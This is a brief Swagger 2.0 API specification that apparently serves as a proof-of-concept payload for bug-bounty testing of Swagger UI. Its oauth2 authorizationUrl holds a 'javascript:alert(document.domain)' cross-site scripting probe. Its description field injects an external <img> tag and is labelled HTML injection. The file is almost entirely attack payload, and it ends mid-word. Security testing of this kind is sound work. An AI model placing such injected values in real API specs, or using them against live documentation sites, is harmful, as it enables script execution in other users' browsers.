swagger: '2.0'
securityDefinitions:
  a:
    type: oauth2
    authorizationUrl: javascript:alert(document.domain)//
info:
  version: "0.0.1"
  title: Example Title
  description: html injection <img src=https://github.com/MehmetBugcrowd/swagger/blob/main/sample%20image.png?raw=true/>
paths:
  /:
    get:
      responses:
        200:
          description: Successful respons
